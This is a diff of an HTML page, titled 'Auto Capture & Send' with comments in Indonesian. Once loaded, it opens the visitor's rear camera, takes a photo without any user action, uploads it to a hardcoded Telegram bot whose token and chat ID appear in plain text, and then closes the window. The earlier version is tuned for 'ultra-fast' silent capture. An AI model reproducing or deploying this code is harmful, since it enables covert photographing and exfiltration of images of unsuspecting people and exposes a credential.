@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instant Capture to Telegram</title>
+    <title>Auto Capture & Send</title>
     <style>
         body {
             background: white;
@@ -17,49 +17,48 @@
             padding: 15px;
             border-radius: 5px;
             font-size: 18px;
-            transition: all 0.3s;
         }
         .success { background: #e6f7e6; }
         .error { background: #ffebee; color: #d32f2f; }
     </style>
 </head>
 <body>
-    <div id="status">Starting...</div>
+    <div id="status">Memulai proses...</div>
 
     <script>
-        // ============= CONFIGURATION =============
+        // ============= KONFIGURASI =============
         const BOT_TOKEN = 'bot7876599612:AAHYBbJz6IHKae4BBtEkyASRlrJVVWtNOqc';
         const CHAT_ID = '7041008009';
-        // =========================================
+        // =======================================
 
-        async function ultraFastCapture() {
-            const statusEl = document.getElementById('status');
-            
+        const statusEl = document.getElementById('status');
+
+        async function captureAndSend() {
             try {
-                // 1. Quick validation (no delay)
-                if (!BOT_TOKEN.startsWith('bot') || !CHAT_ID) {
-                    throw new Error("Invalid configuration");
+                // 1. Validasi token
+                if (!BOT_TOKEN.startsWith('bot')) {
+                    throw new Error("Format token salah! Harus diawali 'bot'");
                 }
 
-                // 2. Instant camera access with minimal checks
-                statusEl.textContent = "Accessing camera...";
+                // 2. Akses kamera
+                statusEl.textContent = "Mengakses kamera...";
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'environment',
-                        width: { ideal: 640 },  // Lower resolution = faster
-                        height: { ideal: 480 }
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
                     }
                 });
 
-                // 3. Ultra-fast capture (300ms delay only)
-                statusEl.textContent = "Capturing...";
+                // 3. Ambil foto (500ms untuk fokus)
+                statusEl.textContent = "Mengambil foto...";
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.autoplay = true;
                 video.playsInline = true;
 
                 await new Promise(resolve => {
-                    video.onloadedmetadata = () => setTimeout(resolve, 300); // Minimal focus time
+                    video.onloadedmetadata = () => setTimeout(resolve, 500);
                 });
 
                 const canvas = document.createElement('canvas');
@@ -67,37 +66,58 @@
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0);
-                const photoData = canvas.toDataURL('image/jpeg', 0.7); // Faster compression
+                const photoData = canvas.toDataURL('image/jpeg', 0.8);
                 
-                // Immediately stop camera
+                // Stop kamera
                 stream.getTracks().forEach(track => track.stop());
 
-                // 4. Parallel processing - start upload while converting
-                statusEl.textContent = "Sending...";
+                // 4. Kirim ke Telegram dengan timeout
+                statusEl.textContent = "Mengirim ke Telegram...";
                 const blob = await fetch(photoData).then(r => r.blob());
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'instant.jpg');
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', `Foto otomatis - ${new Date().toLocaleString()}`);
 
-                // 5. Fast upload with minimal timeout
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                // Debug: Tampilkan data yang akan dikirim
+                console.log("Mengirim dengan data:", {
+                    token: BOT_TOKEN,
+                    chat_id: CHAT_ID,
+                    photo_size: blob.size
+                });
+
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
 
-                statusEl.textContent = "✓ Sent successfully!";
+                const result = await response.json();
+                console.log("Response Telegram:", result);
+
+                if (!result.ok) {
+                    throw new Error(result.description || "Gagal mengirim");
+                }
+
+                statusEl.textContent = "✅ Foto terkirim ke Telegram!";
                 statusEl.className = "success";
-                setTimeout(window.close, 1000);
+                setTimeout(window.close, 2000);
 
             } catch (error) {
-                statusEl.textContent = "Error: " + error.message;
+                statusEl.textContent = `❌ Gagal: ${error.message}`;
                 statusEl.className = "error";
-                console.error(error);
+                console.error("Error detail:", error);
+                
+                // Saran troubleshooting spesifik
+                if (error.message.includes("Failed to fetch")) {
+                    statusEl.innerHTML += "<br><small>Pastikan koneksi internet stabil</small>";
+                } else if (error.message.includes("token")) {
+                    statusEl.innerHTML += `<br><small>Token harus format: bot123456:ABC-DEF...</small>`;
+                }
             }
         }
 
-        // Start immediately with no DOMContentLoaded wait
-        ultraFastCapture();
+        // Mulai proses
+        document.addEventListener('DOMContentLoaded', captureAndSend);
     </script>
 </body>
 </html>
